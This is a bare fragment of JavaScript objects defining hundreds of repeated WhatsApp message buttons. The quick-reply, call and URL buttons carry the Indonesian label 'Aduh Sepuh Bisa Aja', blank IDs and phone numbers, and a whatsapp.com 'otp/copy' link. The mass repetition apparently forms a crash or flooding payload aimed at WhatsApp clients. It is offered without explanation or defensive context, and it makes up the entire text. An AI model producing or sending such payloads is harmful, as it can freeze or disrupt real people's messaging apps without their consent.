{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
 { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
 { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
  { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
   { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
 { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
 { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
  { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
   { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
 { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
 { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
  { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
   { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
 { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
 { callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `😭😭F😱`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
{ urlButton: { displayText: `Aduh Sepuh Bisa Aja`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ quickReplyButton: { displayText: `Aduh Sepuh Bisa Aja`, id: ``}},
{ callButton: { displayText: `Aduh Sepuh Bisa Aja`, phoneNumber: ``}},
